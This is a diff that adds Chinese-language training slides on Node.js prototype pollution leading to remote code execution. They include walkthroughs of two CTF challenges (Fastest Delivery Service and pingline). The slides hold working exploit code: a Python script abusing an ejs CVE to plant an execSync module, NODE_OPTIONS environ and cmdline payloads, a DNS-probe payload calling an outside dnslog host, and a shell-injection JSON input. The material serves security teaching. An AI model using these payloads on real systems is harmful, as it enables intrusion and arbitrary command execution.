@@ -1314,3 +1314,425 @@ ejs.render(template, { name: "John" }, {});
 - 如果能绕过这个缓解措施，我觉得也能拿 CVE 编号，欢迎挑战 \:P
 
 </v-clicks>
+
+---
+
+### 题目：Fastest Delivery Service （BlackHat MEA CTF Qualification 2024）
+
+使用提供的容器镜像，启动服务：
+
+```bash
+docker load -i fastest_delivery_service.tar
+docker run --rm -p 3000:3000 fastest_delivery_service
+```
+
+请尝试利用该服务的漏洞，得到 flag。
+
+---
+
+#### 解题思路 1
+
+- 初步分析：这道题给了一个应用的源代码。应用基于 Node.js，有登录、注册和地址表单功能。最有趣的部分是当我在地址表单的两个字段都提交用户名时，触发了类型错误页面。这个错误显示地址功能在修改用户对象。
+
+- 看 Dockerfile，发现命令随机化了 flag 文件名，所以大概率需要通过 RCE 来获取 flag。
+
+  ```shell
+  echo "$FLAG" > '/tmp/flag_'$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 32).txt
+  ```
+
+- Fuzz 一下发现触发类型错误的 `/address` 端点，代码长这样：
+
+  ```js
+  app.post("/address", (req, res) => {
+    const { user } = req.session;
+    const { addressId, Fulladdress } = req.body;
+    if (user && users[user.username]) {
+      addresses[user.username][addressId] = Fulladdress;
+      users[user.username].address = addressId;
+      res.redirect("/login");
+    } else {
+      res.redirect("/register");
+    }
+  });
+  ```
+
+---
+
+#### 解题思路 2
+
+- 注意到这行代码用用户输入的参数修改对象：
+
+  ```js
+  addresses[user.username][addressId] = Fulladdress;
+  ```
+
+- 容易想到可能存在原型污染漏洞。我们可以控制这些参数：
+
+  - `/register` 端点：`username`
+  - `/address` 端点：`addressId` 和 `FullAddress`
+
+  所以就可以写成：
+
+  ```js
+  addresses["__proto__"]["<用户输入>"] = "<用户输入>";
+  ```
+
+- 检查 `package.json` 发现用了有漏洞的 Ejs 包版本（CVE-2024-33883）：
+
+  ```json
+  {
+    "dependencies": {
+      "ejs": "3.1.9"
+    }
+  }
+  ```
+
+---
+
+#### 解题思路 3
+
+- 整体攻击流程如下：
+
+```python {all|8-9|11-14|16-21}{lines:true, maxHeight:'40%'}
+import re
+import requests
+
+target_url = "<url>"
+
+s = requests.Session()
+
+# 注册原型污染专用账号
+r = s.post(target_url + "/register", data={"username": "__proto__", "password": "asdf"})
+
+# 污染原型链写入恶意函数
+r = s.post(target_url + "/address", data={"addressId": "client", "Fulladdress": "1"})
+payload = """process.mainModule.require("fs").writeFileSync("/tmp/rootxran.js", "function RCE( key ){ \\n const result = process.mainModule.require('child_process').execSync(`${key}`); \\n throw new Error(`Result leak from Error: ${result.toString()}`); \\n}\\n module.exports = RCE;");"""
+r = s.post(target_url + "/address", data={"addressId": "escapeFunction", "Fulladdress": payload})
+
+# 执行命令读取flag
+payload = """process.mainModule.require("/tmp/rootxran.js")("cat /tmp/flag_*");"""
+r = s.post(target_url + "/address", data={"addressId": "escapeFunction", "Fulladdress": payload})
+pattern = r'Result leak from Error: (.*?)<br><br>'
+match = re.search(pattern, r.text, re.DOTALL)
+print(match.group(1).strip())
+```
+
+<v-clicks at="1">
+
+- 注册一个 `__proto__` 用户来污染原型链
+- 在服务端写入恶意模块文件
+- 通过错误信息泄露命令执行结果
+- 最后用 `cat` 命令直接读取随机命名的 flag 文件
+
+</v-clicks>
+
+---
+
+### Node.js 原型链污染到 RCE
+
+如无特别说明，下述 Payload 均只在 Node.js <= 18 下有效。
+
+- 假设存在以下真实 JavaScript 代码：
+
+```javascript
+const { execSync, fork } = require("child_process");
+
+function clone(target) {
+  return merge({}, target);
+}
+
+// 使用用户输入触发原型污染
+// 后续章节将说明如何构造攻击载荷
+clone(USERINPUT);
+
+// 创建子进程时会调用污染环境变量的利用点
+// 在当前目录创建 a_file.js 文件：`echo a=2 > a_file.js`
+var proc = fork("a_file.js");
+```
+
+---
+
+#### 通过环境变量实现原型链污染到 RCE
+
+根据这篇[分析文章](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)，当使用 **`child_process`** 模块的某些方法（如 `fork` 或 `spawn`）创建子进程时，会调用 `normalizeSpawnArguments` 方法。这个方法存在一个**原型污染利用点**，可以通过污染环境变量来注入恶意代码：
+
+```javascript
+// 代码来自 Node.js 源码
+var env = options.env || process.env;
+var envPairs = [];
+// ...
+let envKeys = [];
+// 这里会包含原型链上的属性
+for (const key in env) {
+  ArrayPrototypePush(envKeys, key);
+}
+// ...
+for (const key of envKeys) {
+  const value = env[key];
+  if (value !== undefined) {
+    ArrayPrototypePush(envPairs, `${key}=${value}`); // <-- 污染点
+  }
+}
+```
+
+通过污染 `envPairs`，可以**在环境变量中插入恶意值**。关键是要污染 `.env` 属性，使得新环境变量成为第一个被加载的。
+
+---
+
+#### 污染 `__proto__`
+
+由于 Node.js 的 `child_process` 模块中 `normalizeSpawnArguments` 函数的特性，只要污染了任意属性，就能**设置新的环境变量**。
+例如，污染 `__proto__.avar="valuevar"` 会使得进程运行时带有 `avar=valuevar` 环境变量。
+
+为了让环境变量成为第一个加载的，需要污染 `.env` 属性（某些方法中该变量会成为首个）。
+
+```javascript
+const { execSync, fork } = require("child_process");
+
+Object.prototype.env = {
+  EVIL: "console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//",
+};
+Object.prototype.NODE_OPTIONS = "--require /proc/self/environ";
+
+// 触发利用点
+const proc = fork("./a_file.js"); // 此时会创建 /tmp/pp2rce 文件
+
+// 利用漏洞代码
+USERINPUT = JSON.parse(
+  '{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\"child_process\\").execSync(\\"touch /tmp/pp2rce\\").toString())//"}}}',
+);
+
+clone(USERINPUT);
+const proc = fork("a_file.js"); // 成功执行恶意代码
+```
+
+---
+
+#### 污染 `constructor.prototype`
+
+```javascript
+const { execSync, fork } = require("child_process");
+
+// 手动污染示例
+b = {};
+b.constructor.prototype.env = {
+  EVIL: "console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//",
+};
+b.constructor.prototype.NODE_OPTIONS = "--require /proc/self/environ";
+
+proc = fork("a_file.js"); // 创建 /tmp/pp2rce2
+
+// 利用漏洞代码
+USERINPUT = JSON.parse(
+  '{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\"child_process\\").execSync(\\"touch /tmp/pp2rce2\\").toString())//"}}}}',
+);
+
+clone(USERINPUT);
+
+var proc = fork("a_file.js"); // 执行成功
+```
+
+---
+
+#### 通过命令行参数实现原型链污染到 RCE
+
+另一种攻击方式是利用 `/proc/self/cmdline` 文件存储恶意代码，并通过污染 `argv0` 实现：
+
+```javascript
+const { execSync, fork } = require("child_process");
+
+// 手动污染示例
+b = {};
+b.__proto__.argv0 =
+  "console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//";
+b.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline";
+
+var proc = fork("./a_file.js"); // 创建 /tmp/pp2rce2
+
+// 利用漏洞代码
+USERINPUT = JSON.parse(
+  '{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\"child_process\\").execSync(\\"touch /tmp/pp2rce2\\").toString())//"}}',
+);
+
+clone(USERINPUT);
+
+var proc = fork("a_file.js"); // 执行成功
+```
+
+---
+
+#### DNS 探测攻击
+
+通过污染 `NODE_OPTIONS` 触发 DNS 请求，可用于漏洞验证：
+
+```json
+{
+  "__proto__": {
+    "argv0": "node",
+    "shell": "node",
+    "NODE_OPTIONS": "--inspect=xxx.dnslog.cn"
+  }
+}
+```
+
+---
+layout: two-cols-header
+---
+
+#### 各子进程方法的利用方式
+
+不同 `child_process` 方法对原型污染的利用方式有所差异：
+
+::left::
+
+- `exec` 方法：
+
+```javascript
+// 通过 cmdline 技巧
+const { exec } = require("child_process");
+p = {};
+p.__proto__.shell = "/proc/self/exe"; // 确保执行 node
+p.__proto__.argv0 = "恶意代码";
+p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline";
+var proc = exec("任意命令");
+```
+
+::right::
+
+- `fork` 方法：
+
+```javascript
+// 通过 env 技巧
+const { fork } = require("child_process");
+b = {};
+b.__proto__.env = { EVIL: "恶意代码" };
+b.__proto__.NODE_OPTIONS = "--require /proc/self/environ";
+var proc = fork("任意文件");
+```
+
+---
+
+#### 强制触发子进程执行
+
+如果代码本身没有调用 `spawn`，但存在可控的 `require` 路径，可以诱导其加载恶意模块：
+
+```javascript
+// 污染模块路径
+Object.prototype.main = "/tmp/malicious.js";
+require("某个模块"); // 实际加载恶意脚本
+```
+
+---
+
+### 题目：pingline
+
+使用提供的容器镜像，启动服务：
+
+```bash
+docker load -i pingline.tar
+docker run --rm -p 3000:3000 pingline
+```
+
+请尝试利用该服务的漏洞，得到 flag。
+
+---
+
+#### 解题思路 1
+
+看代码很容易能看到一个很奇怪的函数：
+
+```ts {all|1-4|26-28|19-25}{lines:true, maxHeight:'50%'}
+function jsonParse(
+  str: string,
+  ret?: Record<string, any>,
+): Record<string, any> {
+  ret ??= {};
+
+  if (!(str.startsWith("{") && str.endsWith("}"))) {
+    return ret;
+  }
+
+  const matches = str
+    .slice(1, str.length - 1)
+    .matchAll(
+      /(?:^|,)\s*"(?<key>\w+)"\s*:\s*(?<value>\d+|(?:true|false)|"(?:\\.|[^"])*"|\{.+?})/g,
+    );
+  for (const match of matches) {
+    const { key, value } = match.groups!;
+    if (value.startsWith('"')) {
+      ret[key] = value
+        .slice(1, value.length - 1)
+        .replace(/\\(u([0-9a-fA-F]{4})|.)/g, (_, m: string, code: string) =>
+          m === "u"
+            ? String.fromCharCode(parseInt(code, 16))
+            : ({ b: "\b", f: "\f", n: "\n", r: "\r", t: "\t" }[m] ?? m),
+        );
+    } else if (value.startsWith("{")) {
+      if (!(key in ret)) ret[key] = {};
+      jsonParse(value, ret[key]);
+    } else {
+      ret[key] = { true: true, false: false }[value] ?? +value;
+    }
+  }
+
+  return ret;
+}
+```
+
+<v-clicks at="1">
+
+- 这个函数会解析传入的 JSON 字符串，并将其转换为 JavaScript 对象（居然是用正则）。
+- 可以看到有递归赋值的逻辑，如果遇到 `{` 就会递归调用自己。
+- 如果传入的 JSON 字符串中包含 `__proto__` 字段，就会污染原型链。
+
+</v-clicks>
+
+---
+layout: two-cols-header
+---
+
+#### 解题思路 2
+
+::left::
+
+- 打开浏览器抓包分析正常的请求：
+
+![pingline request](./images/pingline-request.png)
+
+::right::
+
+- 可以观察到代码中调用了 `child_process.spawn` 函数，传入了 `ping` 命令：
+
+  ```ts
+  export async function pingAction(data: string, count: number = 4) {
+    const body: { ip?: string } = jsonParse(data);
+
+    const proc = spawn("ping", [`-c${count}`, body.ip!, "-W1"], {
+      stdio: ["inherit", "pipe", "pipe"],
+      env: { ...process.env, LC_ALL: "C.UTF-8" },
+    });
+
+    let output = "";
+    proc.stdout.on("data", (data) => (output += data));
+    proc.stderr.on("data", (data) => (output += data));
+
+    await new Promise((resolve) => proc.on("close", resolve));
+
+    return output;
+  }
+  ```
+
+---
+
+#### 解题思路 3
+
+根据之前说的 Node.js 原型链污染到 RCE 的原理，可以污染 `__proto__` 来实现 RCE。
+
+```json
+{"ip": "`id`", "__proto__": {"shell": true}}
+```
+
+此时因为开启了 `shell` 选项，而 shell 会执行由反引号包裹的命令，所以会执行 `id` 命令。
+
+![pingline polluted](./images/pingline-polluted.png)
+
